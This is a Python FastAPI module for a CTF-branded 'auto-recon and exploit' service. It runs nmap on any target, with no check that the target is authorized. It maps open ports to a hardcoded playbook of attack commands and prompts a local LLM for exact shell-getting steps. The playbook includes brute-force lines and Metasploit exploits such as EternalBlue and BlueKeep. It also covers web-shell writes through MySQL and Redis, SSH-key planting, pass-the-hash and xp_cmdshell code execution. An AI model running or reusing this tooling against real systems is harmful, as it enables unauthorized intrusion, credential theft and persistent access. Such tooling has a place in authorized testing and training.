"""
CTF Auto-Recon & Exploit — full-scope penetration testing from a bare IP.

Given a target IP/hostname this module:
  1. Runs nmap (-sV -sC) to discover open ports and fingerprint services.
  2. Builds a structured CTF scope — attack vectors, tools, and flag-finding
     hints for every discovered service.
  3. Derives an overall testing strategy ranked by exploitation probability.
  4. Optionally auto-launches Strix for any discovered HTTP/HTTPS services
     with a CTF-tailored instruction set.

Endpoints:
  POST   /ctf/scan              — launch a CTF recon + scope scan
  GET    /ctf/scan/{id}         — full results
  GET    /ctf/scan/{id}/status  — lightweight status poll
  GET    /ctf/scans             — list all scans
  DELETE /ctf/scan/{id}         — delete
  GET    /ctf/nmap-status       — check nmap availability
"""

import asyncio
import json
import os
import shutil
import subprocess
import xml.etree.ElementTree as ET
from datetime import datetime

import structlog
from fastapi import APIRouter, BackgroundTasks, HTTPException
from pydantic import BaseModel

logger = structlog.get_logger()
router = APIRouter()

# ── Persistence ────────────────────────────────────────────────────────────

_DATA_DIR   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data")
_SCANS_FILE = os.path.join(_DATA_DIR, "ctf_scans.json")


def _load_scans() -> dict[int, dict]:
    try:
        with open(_SCANS_FILE) as f:
            raw = json.load(f)
        return {int(k): v for k, v in raw.items()}
    except (FileNotFoundError, json.JSONDecodeError, Exception):
        return {}


def _persist_scans() -> None:
    try:
        os.makedirs(_DATA_DIR, exist_ok=True)
        tmp = _SCANS_FILE + ".tmp"
        with open(tmp, "w") as f:
            json.dump({str(k): v for k, v in _scans.items()}, f)
        os.replace(tmp, _SCANS_FILE)
    except Exception as e:
        logger.warning("ctf_persist_failed", error=str(e))


_scans: dict[int, dict] = _load_scans()
_counter = max(_scans.keys(), default=0)

# ── CTF service knowledge base ─────────────────────────────────────────────

CTF_VECTORS: dict[int, dict] = {
    21: {
        "service": "FTP",
        "severity": "HIGH",
        "attacks": [
            "Anonymous login: ftp TARGET  →  user: anonymous / pass: anything",
            "Look for flag.txt, backup.zip, hidden directories starting with '.'",
            "Check write permission → upload PHP/ASP reverse shell",
            "vsftpd 2.3.4 backdoor (opens port 6200): use exploit/unix/ftp/vsftpd_234_backdoor",
            "Brute force: hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET",
        ],
        "flag_hints": [
            "flag.txt or secret.txt in FTP root",
            "Backup archives (.zip, .tar.gz) may contain source code or flags",
            "Hidden directories starting with '.' — ls -la after login",
        ],
        "tools": ["ftp", "hydra", "metasploit (vsftpd_234_backdoor)", "filezilla"],
    },
    22: {
        "service": "SSH",
        "severity": "MEDIUM",
        "attacks": [
            "Check SSH version banner: ssh -v TARGET — look for known CVEs",
            "Username enumeration: OpenSSH < 7.7 (CVE-2018-15473)",
            "Brute force: hydra -l root -P rockyou.txt ssh://TARGET",
            "If private key found elsewhere: ssh -i id_rsa user@TARGET",
            "Check authorized_keys for enrolled keys in /home/*/.ssh/",
        ],
        "flag_hints": [
            "/home/<user>/user.txt or flag.txt",
            "/root/root.txt (needs root shell)",
            "~/.bash_history, ~/.ssh/known_hosts for pivot hints",
        ],
        "tools": ["ssh-audit", "hydra", "medusa", "metasploit (ssh_enumusers)"],
    },
    23: {
        "service": "Telnet",
        "severity": "CRITICAL",
        "attacks": [
            "Connect directly: telnet TARGET",
            "Default creds: admin/admin, root/root, cisco/cisco",
            "Cleartext protocol — sniff credentials on the network with tcpdump",
        ],
        "flag_hints": ["Root shell → /flag.txt", "Device configuration files"],
        "tools": ["telnet", "hydra"],
    },
    25: {
        "service": "SMTP",
        "severity": "LOW",
        "attacks": [
            "VRFY user enumeration: nc TARGET 25  →  VRFY root",
            "EXPN mailing list: EXPN administrators",
            "Open relay test: swaks --to root@TARGET --from attacker@test.com",
            "Enumerate users → password spray on SSH",
        ],
        "flag_hints": [
            "User enumeration reveals valid accounts → SSH/FTP spray",
            "Email content may contain credentials or flag hints",
        ],
        "tools": ["netcat", "swaks", "smtp-user-enum", "metasploit (smtp_enum)"],
    },
    53: {
        "service": "DNS",
        "severity": "HIGH",
        "attacks": [
            "Zone transfer: dig axfr @TARGET $(dig -x TARGET +short | head -1)",
            "dnsrecon -d <domain> -t axfr",
            "Brute subdomains: gobuster dns -d <domain> -w subdomains-top1mil.txt",
            "TXT records: dig TXT <domain> — often contain flags or credentials",
        ],
        "flag_hints": [
            "Zone transfer reveals internal hostnames and IPs",
            "TXT records frequently hide base64-encoded flags in CTF",
        ],
        "tools": ["dig", "dnsrecon", "fierce", "gobuster (dns mode)"],
    },
    80: {
        "service": "HTTP",
        "severity": "HIGH",
        "attacks": [
            "Directory enum: gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt",
            "Check /robots.txt, /.git/, /.env, /backup/, /admin/, /.htpasswd",
            "Tech fingerprint: whatweb http://TARGET  |  nikto -h http://TARGET",
            "SQLi: sqlmap -u 'http://TARGET/page?id=1' --dbs",
            "LFI: ?page=../../../../etc/passwd or ?file=../../../etc/passwd",
            "SSTI: ?name={{7*7}} or ${7*7} or <%= 7*7 %>",
            "File upload bypass → PHP/ASPX reverse shell",
            "CMS scan: wpscan --url http://TARGET (WordPress) | droopescan (Drupal)",
            "Command injection in all user-controlled fields",
        ],
        "flag_hints": [
            "/flag.txt, /secret.txt, /flag — try these directly",
            "/etc/passwd via LFI → enumerate users",
            "HTML source comments often contain credentials or hints",
            "Admin panels with default creds → RCE or data export",
        ],
        "tools": ["gobuster", "ffuf", "nikto", "sqlmap", "burpsuite", "wpscan", "whatweb"],
    },
    443: {
        "service": "HTTPS",
        "severity": "HIGH",
        "attacks": [
            "All HTTP attacks apply — see port 80",
            "SSL/TLS config: testssl.sh TARGET:443",
            "Certificate CN/SAN may reveal internal vhosts → add to /etc/hosts",
            "Heartbleed (CVE-2014-0160): nmap --script ssl-heartbleed TARGET",
            "BEAST, POODLE, LOGJAM: testssl.sh checks all automatically",
        ],
        "flag_hints": [
            "Same as HTTP — all web-based flag locations apply",
            "Certificate SANs may reveal additional virtual hosts",
        ],
        "tools": ["testssl.sh", "gobuster", "nikto", "sqlmap", "sslyze"],
    },
    110: {
        "service": "POP3",
        "severity": "MEDIUM",
        "attacks": [
            "Connect: nc TARGET 110  →  USER root  →  PASS root",
            "Brute force: hydra -l admin -P rockyou.txt pop3://TARGET",
            "List and read: LIST  →  RETR 1  →  RETR 2",
        ],
        "flag_hints": [
            "Emails often contain credentials, flags, or hints in CTF",
        ],
        "tools": ["netcat", "hydra", "evolution (GUI)"],
    },
    139: {
        "service": "NetBIOS",
        "severity": "HIGH",
        "attacks": [
            "Null session enumeration: enum4linux -a TARGET",
            "List shares: smbclient -L //TARGET/ -N",
            "EternalBlue check: nmap --script=smb-vuln-ms17-010 TARGET",
        ],
        "flag_hints": [
            "SMB share file listings",
            "Windows user account names for password spray",
        ],
        "tools": ["enum4linux", "smbclient", "nmap (smb-vuln scripts)"],
    },
    143: {
        "service": "IMAP",
        "severity": "MEDIUM",
        "attacks": [
            "Connect: nc TARGET 143  →  a1 LOGIN admin password",
            "Brute force: hydra -l admin -P rockyou.txt imap://TARGET",
            "List mailboxes: a1 LIST '' '*'",
            "Read emails: a1 SELECT INBOX  →  a1 FETCH 1 BODY[]",
        ],
        "flag_hints": ["Email bodies and attachments frequently hide flags"],
        "tools": ["netcat", "hydra"],
    },
    445: {
        "service": "SMB",
        "severity": "CRITICAL",
        "attacks": [
            "List shares: smbclient -L //TARGET/ -N",
            "Map shares + permissions: smbmap -H TARGET",
            "Null auth browse: smbclient //TARGET/share -N",
            "EternalBlue MS17-010: use exploit/windows/smb/ms17_010_eternalblue",
            "Zerologon CVE-2020-1472 if domain controller present",
            "Pass-the-hash: impacket psexec.py domain/admin@TARGET -hashes :NTLM",
        ],
        "flag_hints": [
            "\\\\TARGET\\Users\\*\\Desktop\\flag.txt or root.txt",
            "C$ share if admin access: C:\\flag.txt",
            "SYSVOL share may contain GPP passwords (MS14-025)",
        ],
        "tools": ["smbclient", "smbmap", "enum4linux", "impacket", "metasploit"],
    },
    1433: {
        "service": "MSSQL",
        "severity": "CRITICAL",
        "attacks": [
            "Connect: mssqlclient.py sa@TARGET  (try empty password)",
            "Enable xp_cmdshell: EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
            "RCE: EXEC xp_cmdshell 'type C:\\flag.txt';",
            "Default creds: sa/(empty), sa/sa, sa/password",
            "Linked server exploitation for lateral movement",
        ],
        "flag_hints": [
            "xp_cmdshell → type C:\\Users\\*\\Desktop\\flag.txt",
            "Database contents — look for 'flags' or 'secrets' tables",
        ],
        "tools": ["impacket mssqlclient.py", "sqsh", "metasploit (mssql_login)"],
    },
    2049: {
        "service": "NFS",
        "severity": "HIGH",
        "attacks": [
            "List exports: showmount -e TARGET",
            "Mount: mount -t nfs TARGET:/ /mnt/nfs -o nolock",
            "Check no_root_squash: create root-owned file → plant SSH authorized_keys",
            "Look for .ssh/ directories in mounted shares",
        ],
        "flag_hints": [
            "flag.txt directly on the NFS export",
            "Writable share → write SSH key for root access",
        ],
        "tools": ["showmount", "mount", "nmap (nfs-ls, nfs-showmount, nfs-statfs)"],
    },
    3000: {
        "service": "HTTP-Dev (Node/Grafana/Rails)",
        "severity": "HIGH",
        "attacks": [
            "Grafana CVE-2021-43798 path traversal: /public/plugins/alertlist/../../../etc/passwd",
            "Node debug endpoint: /debug/vars, /__proto__, /api/",
            "Default creds: admin/admin (Grafana, Jenkins), guest/guest",
            "JWT secret brute force if auth tokens visible",
        ],
        "flag_hints": [
            "/api/flag, /debug/flag, Grafana datasource credentials",
        ],
        "tools": ["gobuster", "curl", "metasploit (grafana_plugin_dir_traversal)"],
    },
    3306: {
        "service": "MySQL",
        "severity": "HIGH",
        "attacks": [
            "Connect: mysql -h TARGET -u root -p  (try empty password)",
            "Dump all: mysqldump -h TARGET -u root --all-databases",
            "Write web shell: SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'",
            "File read (if FILE priv): SELECT LOAD_FILE('/etc/passwd')",
            "UDF injection for RCE if FILE + INSERT privileges",
        ],
        "flag_hints": [
            "SELECT LOAD_FILE('/flag.txt') or LOAD_FILE('/root/flag.txt')",
            "User table password hashes → crack offline",
            "Custom 'flags', 'secrets', or 'users' tables",
        ],
        "tools": ["mysql", "hydra", "sqlmap", "metasploit (mysql_login, mysql_file_read)"],
    },
    3389: {
        "service": "RDP",
        "severity": "HIGH",
        "attacks": [
            "BlueKeep CVE-2019-0708: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            "DejaBlue CVE-2019-1182: similar attack on newer systems",
            "Brute force: hydra -l administrator -P rockyou.txt rdp://TARGET",
            "Connect: xfreerdp /u:admin /p:password /v:TARGET",
        ],
        "flag_hints": [
            "C:\\Users\\Administrator\\Desktop\\flag.txt",
            "C:\\Users\\*\\Desktop\\root.txt",
            "C:\\flag.txt",
        ],
        "tools": ["xfreerdp", "rdesktop", "hydra", "metasploit (bluekeep_rce)"],
    },
    5432: {
        "service": "PostgreSQL",
        "severity": "HIGH",
        "attacks": [
            "Connect: psql -h TARGET -U postgres  (try 'postgres' as password)",
            "RCE if superuser: COPY cmd FROM PROGRAM 'id'; or CREATE EXTENSION pg_execute_server_program",
            "File read: SELECT pg_read_file('/etc/passwd');",
            "Check pg_hba.conf for trust auth: SELECT pg_read_file('pg_hba.conf');",
        ],
        "flag_hints": [
            "SELECT pg_read_file('/flag.txt') or pg_read_file('/root/flag.txt')",
            "Database user password hashes in pg_shadow",
        ],
        "tools": ["psql", "metasploit (postgres_login, postgres_execute)"],
    },
    5900: {
        "service": "VNC",
        "severity": "HIGH",
        "attacks": [
            "Connect: vncviewer TARGET — try empty password",
            "Brute force: hydra -P rockyou.txt vnc://TARGET",
            "Check for CVE-2006-2369 (RealVNC auth bypass)",
        ],
        "flag_hints": ["Desktop visible directly — screenshot the flag"],
        "tools": ["vncviewer", "hydra", "metasploit (vnc_login)"],
    },
    6379: {
        "service": "Redis",
        "severity": "CRITICAL",
        "attacks": [
            "Connect (usually no auth): redis-cli -h TARGET PING",
            "List all keys: redis-cli -h TARGET KEYS '*'",
            "Plant SSH key: CONFIG SET dir /root/.ssh → SET payload '\\nssh-rsa ...' → CONFIG SET dbfilename authorized_keys → SAVE",
            "Write PHP shell to webroot: CONFIG SET dir /var/www/html → CONFIG SET dbfilename shell.php → SET payload '<?php system($_GET[c]);?>' → SAVE",
            "RCE via rogue Redis server (linux only): redis-rogue-server",
        ],
        "flag_hints": [
            "GET flag or GET secret",
            "CONFIG GET dir → reveals web root path",
            "KEYS * → look for 'flag', 'secret', 'password' keys",
        ],
        "tools": ["redis-cli", "redis-rogue-server", "metasploit (redis_unauth_exec)"],
    },
    8080: {
        "service": "HTTP-Alt (Tomcat/Jenkins/JBoss)",
        "severity": "HIGH",
        "attacks": [
            "Tomcat /manager/html: default creds tomcat/tomcat, admin/admin",
            "Deploy malicious WAR via Tomcat Manager → RCE",
            "Jenkins /script console: 'cat /flag.txt'.execute().text",
            "JBoss: exploit/multi/http/jboss_maindeployer",
            "Spring Boot Actuator: /actuator/env, /actuator/heapdump",
        ],
        "flag_hints": [
            "Tomcat WAR deploy → RCE → /flag.txt",
            "Jenkins Groovy: def cmd = 'cat /flag.txt'.execute(); println cmd.text",
            "Spring Boot /actuator/env may expose credentials",
        ],
        "tools": ["gobuster", "metasploit (tomcat_mgr_upload, jenkins_script_console)"],
    },
    8443: {
        "service": "HTTPS-Alt",
        "severity": "HIGH",
        "attacks": [
            "All HTTPS/HTTP attacks apply",
            "Check for Kubernetes API server (common on 8443)",
            "Verify admin panels and default credentials",
        ],
        "flag_hints": ["/flag.txt", "Admin panel behind TLS"],
        "tools": ["gobuster", "nikto", "kubectl (if Kubernetes)"],
    },
    9200: {
        "service": "Elasticsearch",
        "severity": "HIGH",
        "attacks": [
            "No auth by default: curl http://TARGET:9200/_cat/indices",
            "Dump all data: curl 'http://TARGET:9200/<index>/_search?size=9999'",
            "Check _all index: curl http://TARGET:9200/_all/_search",
            "Groovy script RCE (ES < 1.6): POST to /_search with script",
        ],
        "flag_hints": [
            "Look for index names containing 'flag', 'secret', 'cred'",
            "User credentials often stored in ES for web apps",
        ],
        "tools": ["curl", "elasticdump", "metasploit (elasticsearch_script_mvel_rce)"],
    },
    27017: {
        "service": "MongoDB",
        "severity": "HIGH",
        "attacks": [
            "Connect no auth: mongosh --host TARGET",
            "Enumerate: show dbs → use <db> → show collections → db.coll.find()",
            "NoSQL injection in web app: {\"$gt\": \"\"} or {\"$ne\": null}",
            "Check for .mongorc.js backdoor",
        ],
        "flag_hints": [
            "db.flags.find() or db.getCollectionNames()",
            "Look for 'secrets', 'users', 'admin' collections",
            "User password hashes for offline cracking",
        ],
        "tools": ["mongosh", "metasploit (mongodb_login)", "NoSQLMap"],
    },
}

DEFAULT_VECTORS = {
    "severity": "LOW",
    "attacks": [
        "Banner grab: nc -nv TARGET {port}",
        "Service version lookup in CVE databases",
        "Try default credentials for the service",
        "Fuzz the service protocol with custom payloads",
    ],
    "flag_hints": [
        "Check service-specific configuration files",
        "Look for debug/admin interfaces",
    ],
    "tools": ["netcat", "nmap scripts", "searchsploit", "metasploit"],
}


# ── Schemas ────────────────────────────────────────────────────────────────

class CTFScanRequest(BaseModel):
    target: str
    ports: str = "common"         # "common" = top 1000 | "full" = 1-65535 | custom range
    scan_speed: int = 4           # nmap -T1 through -T5
    launch_strix: bool = True     # auto-launch Strix on discovered web services
    strix_mode: str = "deep"      # quick | standard | deep
    run_default_scripts: bool = True   # nmap -sC
    run_vuln_scripts: bool = False     # nmap --script vuln (slower)


class PortInfo(BaseModel):
    port: int
    protocol: str
    state: str
    service: str
    version: str
    cpe: str | None = None


class ServiceScope(BaseModel):
    port: int
    service: str
    severity: str
    version: str
    attacks: list[str]
    flag_hints: list[str]
    tools: list[str]
    strix_scan_id: int | None = None


# ── Helpers ────────────────────────────────────────────────────────────────

def _nmap_common_paths() -> list[str]:
    import sys
    if sys.platform == "win32":
        return [
            r"C:\Program Files (x86)\Nmap\nmap.exe",
            r"C:\Program Files\Nmap\nmap.exe",
        ]
    if sys.platform == "darwin":
        return [
            "/opt/homebrew/bin/nmap",    # Apple Silicon (M1/M2/M3)
            "/usr/local/bin/nmap",       # Intel Mac (Homebrew)
            "/usr/bin/nmap",
        ]
    # Linux
    return [
        "/usr/bin/nmap",
        "/usr/local/bin/nmap",
        "/bin/nmap",
    ]


def _resolve_nmap() -> str:
    found = shutil.which("nmap") or shutil.which("nmap.exe")
    if found:
        return found
    for p in _nmap_common_paths():
        if shutil.os.path.isfile(p):
            return p
    return "nmap"


def _nmap_available() -> bool:
    if shutil.which("nmap") or shutil.which("nmap.exe"):
        return True
    return any(shutil.os.path.isfile(p) for p in _nmap_common_paths())


def _nmap_install_hint() -> str:
    import sys
    if sys.platform == "win32":
        return "Install nmap: winget install nmap  (then add C:\\Program Files (x86)\\Nmap to PATH, or restart BluJay)"
    if sys.platform == "darwin":
        return "Install nmap: brew install nmap"
    return "Install nmap: sudo apt install nmap  |  sudo yum install nmap  |  sudo pacman -S nmap"


def _build_nmap_cmd(target: str, ports: str, speed: int, scripts: bool, vuln: bool) -> list[str]:
    cmd = [_resolve_nmap(), "-sV", f"-T{speed}", "-oX", "-", "--open"]
    if scripts:
        cmd.append("-sC")
    if vuln:
        cmd += ["--script", "vuln"]
    if ports == "common":
        pass  # nmap default = top 1000
    elif ports == "full":
        cmd += ["-p", "1-65535"]
    else:
        cmd += ["-p", ports]
    cmd.append(target)
    return cmd


def _run_nmap_sync(target: str, ports: str, speed: int, scripts: bool, vuln: bool):
    cmd = _build_nmap_cmd(target, ports, speed, scripts, vuln)
    try:
        result = subprocess.run(cmd, capture_output=True, timeout=600, text=True)
        xml = result.stdout
    except subprocess.TimeoutExpired:
        return [], None, ""
    except Exception as e:
        logger.error("nmap_run_error", error=str(e))
        return [], None, ""
    return _parse_nmap_xml(xml), _parse_os_guess(xml), xml


def _parse_nmap_xml(xml_str: str) -> list[PortInfo]:
    ports: list[PortInfo] = []
    if not xml_str.strip():
        return ports
    try:
        root = ET.fromstring(xml_str)
    except ET.ParseError:
        return ports
    for host in root.findall(".//host"):
        for port_el in host.findall(".//port"):
            state_el = port_el.find("state")
            if state_el is None or state_el.get("state") != "open":
                continue
            svc = port_el.find("service")
            svc_name = svc.get("name", "unknown") if svc is not None else "unknown"
            ver_parts = []
            if svc is not None:
                for attr in ("product", "version", "extrainfo"):
                    v = svc.get(attr, "")
                    if v:
                        ver_parts.append(v)
            svc_ver = " ".join(ver_parts)
            cpe = None
            if svc is not None:
                cpe_el = svc.find("cpe")
                if cpe_el is not None:
                    cpe = cpe_el.text
            ports.append(PortInfo(
                port=int(port_el.get("portid", 0)),
                protocol=port_el.get("protocol", "tcp"),
                state="open",
                service=svc_name,
                version=svc_ver,
                cpe=cpe,
            ))
    return ports


def _parse_os_guess(xml_str: str) -> str | None:
    try:
        root = ET.fromstring(xml_str)
        for osmatch in root.findall(".//osmatch"):
            name = osmatch.get("name")
            acc = int(osmatch.get("accuracy", "0"))
            if name and acc >= 75:
                return f"{name} ({acc}% confidence)"
    except Exception:
        pass
    return None


def _get_vectors(port: int, service_name: str) -> dict:
    v = CTF_VECTORS.get(port)
    if v:
        return v
    sl = service_name.lower()
    for kw, p in [("http", 80), ("https", 443), ("ftp", 21), ("ssh", 22),
                  ("smb", 445), ("microsoft-ds", 445), ("mysql", 3306),
                  ("redis", 6379), ("mongodb", 27017), ("postgresql", 5432)]:
        if kw in sl:
            return CTF_VECTORS.get(p, DEFAULT_VECTORS)
    dv = dict(DEFAULT_VECTORS)
    dv["attacks"] = [a.replace("{port}", str(port)) for a in dv["attacks"]]
    return dv


def _build_scope(ports: list[PortInfo]) -> list[ServiceScope]:
    scope = []
    for p in ports:
        v = _get_vectors(p.port, p.service)
        scope.append(ServiceScope(
            port=p.port,
            service=v.get("service", p.service),
            severity=v.get("severity", "LOW"),
            version=p.version,
            attacks=[a.replace("TARGET", p.port and "TARGET" or "TARGET") for a in v.get("attacks", [])],
            flag_hints=v.get("flag_hints", []),
            tools=v.get("tools", []),
        ))
    return scope


def _build_strategy(scope: list[ServiceScope], os_guess: str | None, target: str) -> list[str]:
    strategy = []
    ports = {s.port for s in scope}

    if os_guess:
        if "Windows" in os_guess:
            strategy.append(f"Windows target — {os_guess}")
            if 445 in ports:
                strategy.append(f"CRITICAL: Run EternalBlue check immediately: nmap --script=smb-vuln-ms17-010 {target}")
        elif "Linux" in os_guess:
            strategy.append(f"Linux target — {os_guess}")
            strategy.append("Post-compromise: find SUID binaries: find / -perm -u=s -type f 2>/dev/null")

    priority = []
    if 6379 in ports:
        priority.append(f"1. Redis (LIKELY NO AUTH): redis-cli -h {target} KEYS '*'")
    if 27017 in ports:
        priority.append(f"2. MongoDB (LIKELY NO AUTH): mongosh --host {target} → show dbs")
    if 9200 in ports:
        priority.append(f"3. Elasticsearch (LIKELY NO AUTH): curl http://{target}:9200/_cat/indices")
    if 445 in ports or 139 in ports:
        priority.append(f"4. SMB: smbclient -L //{target}/ -N && enum4linux -a {target}")
    if 80 in ports or 443 in ports or 8080 in ports:
        priority.append(f"5. Web: gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt")
    if 21 in ports:
        priority.append(f"6. FTP: ftp {target}  (user: anonymous, pass: anything)")
    if 3306 in ports:
        priority.append(f"7. MySQL: mysql -h {target} -u root  (try empty password)")
    if 5432 in ports:
        priority.append(f"8. PostgreSQL: psql -h {target} -U postgres")
    if 1433 in ports:
        priority.append(f"9. MSSQL: mssqlclient.py sa@{target}")
    if 2049 in ports:
        priority.append(f"10. NFS: showmount -e {target} && mount -t nfs {target}:/ /mnt/")
    if 22 in ports:
        priority.append("SSH: Keep for access after credentials found elsewhere")

    strategy.extend(priority)
    strategy.extend([
        "General: Always read /etc/passwd (Linux) or C:\\Windows\\System32\\config (Windows) if you get file read",
        "Linux priv-esc: check sudo -l, kernel version (uname -a), cron jobs (/etc/cron*), writable files",
        "Windows priv-esc: systeminfo for KB patches, whoami /priv for SeImpersonatePrivilege (JuicyPotato)",
        "Search config files: grep -r 'password\\|secret\\|api_key' /var/www/ /etc/ /opt/ 2>/dev/null",
    ])
    return strategy


# ── AI analysis ────────────────────────────────────────────────────────────

async def _ai_ctf_analysis(ports: list[PortInfo], os_guess: str | None, target: str) -> str | None:
    """
    Call Ollama (metatron-qwen) directly for a CTF-focused attack analysis.
    Best-effort — never raises, returns None if Ollama is offline.
    """
    if not ports:
        return None

    services_text = "\n".join(
        f"  - {p.port}/{p.protocol}  {p.service}  {p.version}".rstrip()
        for p in ports
    )

    prompt = (
        f"You are an expert CTF (Capture the Flag) penetration tester.\n\n"
        f"Target IP: {target}\n"
        f"OS: {os_guess or 'unknown'}\n\n"
        f"Open ports and services:\n{services_text}\n\n"
        "Analyze this target and provide a concise, actionable CTF strategy:\n\n"
        "INITIAL ACCESS:\n"
        "[The single most likely way to get a shell or first flag — be specific, include exact commands]\n\n"
        "ATTACK PRIORITY:\n"
        "[Numbered list — which service to hit first and why, based on typical CTF patterns]\n\n"
        "KEY VULNERABILITIES:\n"
        "[Any specific CVEs, known misconfigs, or default credentials suggested by the version info]\n\n"
        "FLAG LOCATIONS:\n"
        "[Where flags are most likely hidden given this service profile]\n\n"
        "Keep each section to 2-4 lines. Be direct and specific, not generic."
    )

    try:
        import httpx
        async with httpx.AsyncClient(timeout=90.0) as client:
            resp = await client.post(
                "http://localhost:11434/api/generate",
                json={"model": "metatron-qwen", "prompt": prompt, "stream": False},
            )
            if resp.status_code == 200:
                return resp.json().get("response", "").strip() or None
    except Exception as e:
        logger.warning("ctf_ai_analysis_failed", error=str(e))
    return None


# ── Background task ────────────────────────────────────────────────────────

async def _run_ctf_scan(scan_id: int, req: CTFScanRequest) -> None:
    scan = _scans[scan_id]
    scan["phase"] = "port_discovery"
    scan["started_at"] = datetime.utcnow().isoformat()

    loop = asyncio.get_event_loop()
    try:
        # ── Phase 1: Port discovery ────────────────────────────────────────
        open_ports, os_guess, _ = await loop.run_in_executor(
            None,
            lambda: _run_nmap_sync(
                req.target, req.ports, req.scan_speed,
                req.run_default_scripts, req.run_vuln_scripts,
            ),
        )
        scan["open_ports"] = [p.model_dump() for p in open_ports]
        scan["os_guess"] = os_guess
        _persist_scans()

        # ── Phase 2: Scope + AI analysis ──────────────────────────────────
        scan["phase"] = "scope_analysis"
        scope = _build_scope(open_ports)
        strategy = _build_strategy(scope, os_guess, req.target)
        scan["scope"] = [s.model_dump() for s in scope]
        scan["overall_strategy"] = strategy

        # AI is best-effort — never blocks the scan if Ollama is offline
        ai_text = await _ai_ctf_analysis(open_ports, os_guess, req.target)
        scan["ai_analysis"] = ai_text
        _persist_scans()

        # ── Phase 3: Strix integration ─────────────────────────────────────
        scan["phase"] = "strix_integration"
        strix_scan_ids: list[int] = []
        strix_targets: list[str] = []

        if req.launch_strix:
            web_ports = [
                p for p in open_ports
                if p.port in (80, 443, 8080, 8443, 8000, 8888, 3000, 5000)
                or "http" in p.service.lower()
            ]
            for wp in web_ports[:2]:
                scheme = "https" if wp.port in (443, 8443) else "http"
                port_suffix = f":{wp.port}" if wp.port not in (80, 443) else ""
                web_target = f"{scheme}://{req.target}{port_suffix}"
                strix_targets.append(web_target)
                instruction = (
                    f"CTF challenge target. OS: {os_guess or 'unknown'}. "
                    f"All open services: {', '.join(f'{p.port}/{p.service}' for p in open_ports)}. "
                    "Primary objectives: find flag{{...}} pattern, /flag.txt, /root/root.txt, /home/*/user.txt. "
                    "Attack vectors: SQLi, LFI, RFI, command injection, SSTI, auth bypass, "
                    "insecure file upload, exposed .git/, default credentials. "
                    "Check all endpoints exhaustively. Report any flag-like strings found."
                )
                try:
                    import httpx
                    async with httpx.AsyncClient(timeout=30.0) as client:
                        resp = await client.post(
                            "http://localhost:8000/api/v1/strix/scan",
                            json={
                                "target": web_target,
                                "scan_mode": req.strix_mode,
                                "instruction": instruction,
                                "auto_triage": True,
                            },
                        )
                        if resp.status_code == 200:
                            sid = resp.json().get("id")
                            if sid:
                                strix_scan_ids.append(sid)
                                for s in scan["scope"]:
                                    if s["port"] == wp.port:
                                        s["strix_scan_id"] = sid
                except Exception as e:
                    logger.warning("ctf_strix_launch_failed", error=str(e))

        scan["strix_scan_ids"] = strix_scan_ids
        scan["strix_targets"] = strix_targets

        # ── Phase 4: Complete ──────────────────────────────────────────────
        scan["status"] = "complete"
        scan["phase"] = "complete"
        scan["completed_at"] = datetime.utcnow().isoformat()
        _persist_scans()

    except Exception as e:
        logger.error("ctf_scan_error", scan_id=scan_id, error=str(e))
        scan["status"] = "error"
        scan["error"] = str(e)
        scan["completed_at"] = datetime.utcnow().isoformat()
        _persist_scans()


# ── Routes ─────────────────────────────────────────────────────────────────

@router.get("/nmap-status", summary="Check if nmap is installed")
async def nmap_status():
    available = _nmap_available()
    return {
        "available": available,
        "path": _resolve_nmap() if available else None,
        "hint": _nmap_install_hint() if not available else None,
    }


@router.post("/scan", summary="Launch CTF auto-recon + scope generation")
async def start_ctf_scan(req: CTFScanRequest, background_tasks: BackgroundTasks):
    if not _nmap_available():
        raise HTTPException(503, "nmap is not installed. Install it to use CTF mode.")
    if req.scan_speed not in range(1, 6):
        raise HTTPException(400, "scan_speed must be 1-5")

    global _counter
    _counter += 1
    scan_id = _counter

    _scans[scan_id] = {
        "id": scan_id,
        "target": req.target,
        "status": "running",
        "phase": "queued",
        "open_ports": [],
        "scope": [],
        "os_guess": None,
        "ai_analysis": None,
        "strix_targets": [],
        "strix_scan_ids": [],
        "overall_strategy": [],
        "started_at": None,
        "completed_at": None,
        "error": None,
    }

    _persist_scans()
    background_tasks.add_task(_run_ctf_scan, scan_id, req)
    return {"id": scan_id, "status": "running", "target": req.target}


@router.get("/scan/{scan_id}/status", summary="Lightweight status poll")
async def ctf_scan_status(scan_id: int):
    scan = _scans.get(scan_id)
    if not scan:
        raise HTTPException(404, f"Scan {scan_id} not found")
    return {
        "id": scan["id"],
        "status": scan["status"],
        "phase": scan["phase"],
        "ports_found": len(scan["open_ports"]),
        "strix_scan_ids": scan.get("strix_scan_ids", []),
        "error": scan.get("error"),
    }


@router.get("/scan/{scan_id}", summary="Get full CTF scan results")
async def get_ctf_scan(scan_id: int):
    scan = _scans.get(scan_id)
    if not scan:
        raise HTTPException(404, f"Scan {scan_id} not found")
    return scan


@router.get("/scans", summary="List all CTF scans")
async def list_ctf_scans():
    return [
        {
            "id": s["id"],
            "target": s["target"],
            "status": s["status"],
            "phase": s["phase"],
            "ports_found": len(s["open_ports"]),
            "strix_scan_ids": s.get("strix_scan_ids", []),
            "open_ports": [],
            "started_at": s.get("started_at"),
            "completed_at": s.get("completed_at"),
        }
        for s in reversed(list(_scans.values()))
    ]


@router.delete("/scans", summary="Delete all CTF scans")
async def delete_all_ctf_scans():
    running = [sid for sid, s in _scans.items() if s.get("status") == "running"]
    if running:
        raise HTTPException(409, f"Cannot clear: {len(running)} scan(s) still running")
    _scans.clear()
    _persist_scans()
    return {"status": "cleared"}


@router.delete("/scan/{scan_id}", summary="Delete a CTF scan")
async def delete_ctf_scan(scan_id: int):
    if scan_id not in _scans:
        raise HTTPException(404, f"Scan {scan_id} not found")
    del _scans[scan_id]
    _persist_scans()
    return {"status": "deleted", "id": scan_id}
